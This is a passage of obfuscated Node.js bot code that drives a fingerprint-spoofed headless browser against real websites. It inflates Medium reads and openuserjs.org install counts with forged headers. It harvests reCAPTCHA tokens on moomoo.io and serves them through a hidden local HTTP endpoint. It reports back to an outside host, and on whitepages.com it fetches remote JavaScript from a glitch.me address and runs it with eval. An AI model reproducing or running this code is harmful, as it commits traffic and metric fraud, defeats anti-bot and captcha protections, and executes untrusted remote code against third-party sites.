      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + X(0x18, '@)EJ') + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + W(0x4) + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + W(0x1b) + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + X(0x16, 'dpye'),
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    X(0x15, '7q*t') + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x1 * 0x1ce6 + -0x23c9 * -0x1 + 0x1 * -0x6e3
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const Y = b;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + Y(0x19, '9*qX') + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x16ac + -0xb * 0x83 + 0x325 * 0x9)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x169e + 0xfa0 + -0x25da), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x4e5 * -0x6 + 0x20f + 0x1bb3), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0xc18 + -0x20aa + 0x2cc2;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x11 * -0xf9 + 0x2 * 0x54c + -0x56d * 0x5; w < getRandomInt(0x1e77 + -0x192f + 0x1 * -0x547, 0x1f36 + -0xc * -0x1d8 + -0x3551 * 0x1); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x6cdc + 0x1 * -0x189ef + -0x34f * -0x9d);
        }
      }();
    }, 0x1384 + -0x1c * 0xae + -0x18), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const Z = b;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x9d9 * 0x2 + -0x2 * -0xb + 0x4e7 * 0x4;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y[Z(0x3, 'kMZ3')](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x1040 + 0xe87 + 0x1 * -0x1ec7, 0x167 * 0x7 + -0x1f * -0x2e + -0xf31 * 0x1)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0xe1e3 + 0x7 * 0x155 + -0x3b03 * 0x2);
    }, -0xc9c + 0x10be + -0x1df * 0x2), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x11 * -0x22b + 0x1ef0 + 0x5eb;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x1e1d + -0x1a58 + 0x442d * 0x1), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x362 * -0x4 + -0x4f + -0xd39), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x15a23b + 0x2347 * -0x73 + 0x3336c0);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x16f4 + 0xc * 0x15f + -0x2704);
  })()), doFlags['doCreateSe' + V(0xf)]) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x3 * 0x771 + 0x41f + -0x1 * 0x19aa);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x887 * -0x7 + -0x315b + 0x153a);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x25 * 0x32 + 0x1 * 0x10bb + -0x981);
    let h = e[f];
    if (b['ogMzIS'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x2db + -0x48d * 0x3 + -0xacc * -0x1, s, t, u = -0x3ec * 0x5 + -0xf60 + -0x2 * -0x117e; t = n['charAt'](u++); ~t && (s = r % (-0x15d + -0x186 + -0x2e7 * -0x1) ? s * (0x7 * 0x22c + 0x11a1 + -0x2095) + t : t, r++ % (0x1a6f + -0xe80 + -0xbeb)) ? p += String['fromCharCode'](-0x1c * 0x85 + 0x1 * 0x1feb + -0x1060 & s >> (-(0x14b6 + 0x217e + -0x3632) * r & -0xa11 + -0xe3 * -0x17 + -0xa4e)) : -0x1 * 0x1e4a + 0x1c55 + 0x1f5) {
          t = o['indexOf'](t);
        }
        for (let v = -0x1a54 + 0x15 * 0x1ae + -0xa * 0xe5, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x1 * 0x2437 + 0x67e + -0x2aa5 * 0x1))['slice'](-(-0x9a * -0x4 + 0x1b3 + -0x419));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x10b + 0x1cab + -0x2 * 0xedb,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x2 * 0x1351 + -0xd * -0x89 + -0x2d97; u < 0xb83 + 0x1cf1 + 0xa * -0x3f2; u++) {
          p[u] = u;
        }
        for (u = -0x1c4d * 0x1 + 0x132 + 0x1b1b; u < -0x161 * -0xd + -0x1 * -0x10c9 + -0x21b6; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x1847 + -0x1 * 0x14bd + -0x28a), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1d9e + 0xd76 + -0x2b14, q = 0x2123 * -0x1 + -0x18e3 + 0xe * 0x425;
        for (let v = 0x1fe * -0x13 + 0x845 + -0x1 * -0x1d95; v < n['length']; v++) {
          u = (u + (0x7 * 0x1d3 + 0x2 * 0x7f7 + -0x1cb2)) % (0xb * 0x259 + -0x10 * -0x20b + -0x3983), q = (q + p[u]) % (0xff2 * -0x2 + -0x1 * 0x1b1f + -0x1b * -0x239), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1 * 0x13a9 + 0x1a3 * -0x7 + 0x100f * 0x2)]);
        }
        return t;
      };
      b['WNGLkK'] = m, c = arguments, b['ogMzIS'] = !![];
    }
    const j = e[-0x1bd0 + 0x1cab * -0x1 + 0x387b],
      k = f + j,
      l = c[k];
    return !l ? (b['qaLvEF'] === undefined && (b['qaLvEF'] = !![]), h = b['WNGLkK'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
doFlags['doOUJS'] && ((async () => {
  const a2 = b,
    a1 = d;
  async function f() {
    const a0 = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x4 * -0x346 + 0x1 * 0x2704 + -0x1 * 0x19eb) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x13 * -0x4f + -0x24ad + 0x2a8b));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0xbcb + 0x11 * 0x1dd + -0x2b78, D['indexOf']('\x20'));
        return B ? E['slice'](0x72e + -0x1 * 0x1267 + 0xb39, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x2c8e * -0x1 + -0x2 * -0xa8f + -0x1a9c),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x15cd * -0x1 + -0x4de0 + -0x3 * -0x2e3f),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': a0(0x12, 'PAaG'),
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + a1(0x0) + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + a1(0xd),
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + a2(0x17, 'tlbq') + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x119 * 0x7 + 0x58a + 0xb7 * 0x3; k < 0x2132 + 0x66f + -0x279d; k++)
    setTimeout(f, (-0x1504 + 0xbc75 + 0x95 * 0x73) * k * getRandomInt(0x1 * 0x1f8d + -0x112a + -0x1 * 0xe62, -0x24c2 + 0x95 * 0x43 + -0x23a));
  setInterval(() => {
    f();
    for (let l = 0x1 * 0x5bf + 0x3 * -0xc64 + 0x1f6d; l < 0x22 * -0x31 + 0x39 * 0x59 + -0x53 * 0x29; l++)
      setTimeout(f, (-0xc2d * -0x11 + 0x67cf + -0x4c6c) * l * getRandomInt(0x20ab + 0x16ba + 0xdd9 * -0x4, -0x1b1 * -0x17 + -0x1 * -0x839 + -0x6bb * 0x7));
